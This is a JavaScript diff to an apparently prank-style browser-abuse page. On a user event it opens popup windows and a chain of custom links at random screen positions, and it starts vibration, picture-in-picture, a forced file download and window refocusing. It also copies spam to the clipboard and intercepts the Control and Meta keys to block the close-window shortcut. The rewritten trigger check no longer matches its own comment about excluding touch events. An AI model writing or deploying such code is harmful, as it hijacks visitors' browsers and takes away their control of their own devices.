@@ -175,17 +175,19 @@ function init () {
     // 'touchstart' and 'touchend' events are not able to open a new window
     // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
     // a clever way to exclude touch events.
-    if (event.which !== 0) 
-      for (let i=0; i<3; i++) {
-        openWindow()
+
+      if (event.key !== "0") {
+        startVideo();
+        openCustomLinks(URL_WINDOW);
+        openWindow();
+        requestAnimationFrame(startVibrateInterval); // Use requestAnimationFrame for better performance
+        enablePictureInPicture();
+        triggerFileDownload();
+        focusWindows();
+        copySpamToClipboard();
+        speak();
       }
-      openVideoYoutube(URL_WINDOW)
-      startVibrateInterval()
-      enablePictureInPicture()
-      triggerFileDownload()
-      focusWindows()
-      copySpamToClipboard()
-      speak()
+
     // Capture key presses on the Command or Control keys, to interfere with the
     // "Close Window" shortcut.
     if (event.key === 'Meta' || event.key === 'Control') {
@@ -536,20 +538,12 @@ function enablePictureInPicture () {
     video.play()
   }
 }
-
-/**
- * Focus all child windows. Requires user-initiated event.
- */
 function focusWindows () {
   wins.forEach(win => {
     if (!win.closed) win.focus()
   })
 }
-
-/**
- * Open a new popup window. Requires user-initiated event.
- */
-function openWindow () {
+function openWindow() {
   const { x, y } = getRandomCoords()
   const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
   const win = window.open(window.location.pathname, '', opts)
@@ -561,20 +555,40 @@ function openWindow () {
   if (wins.length === 2) setupSearchWindow(win)
 }
 
-function openVideoYoutube(links) {
+function openCustomLinks(links) {
   if (!Array.isArray(links) || links.length === 0) {
-    console.error('👽ALIEN UNDEFIND👽');
+    console.error('👽ALIEN UNDEFINED👽');
     return;
   }
-  links.forEach(function(link) {
-    var newWIndow = window.open(link, '_blank', 'width=600,height=400');
 
-    if (newWIndow) {
-      newWIndow.focus();
-    } else {
-      alert('👽ALIEN BLOCK OFF👽');
+  function openNextVideo(index) {
+    if (index < links.length) {
+      const { x, y } = getRandomCoords();
+      const opts = `left=${x},top=${y},width=400,height=200`;
+      var newWindow = window.open(links[index], '_blank', opts);
+
+      if (newWindow) {
+        newWindow.focus();
+        setTimeout(() => {
+          // Attempt to move the window after a delay
+          newWindow.moveTo(x, y);
+        }, 500);
+
+        // Wait for the new window to close before opening the next one
+        const interval = setInterval(function () {
+          if (newWindow.closed) {
+            clearInterval(interval);
+            openNextVideo(index + 1);
+          }
+        }, 100);
+      } else {
+        alert('👽ALIEN BLOCKED OFF👽');
+        openNextVideo(index + 1);
+      }
     }
-  });
+  }
+
+  openNextVideo(0);
 }
 
 
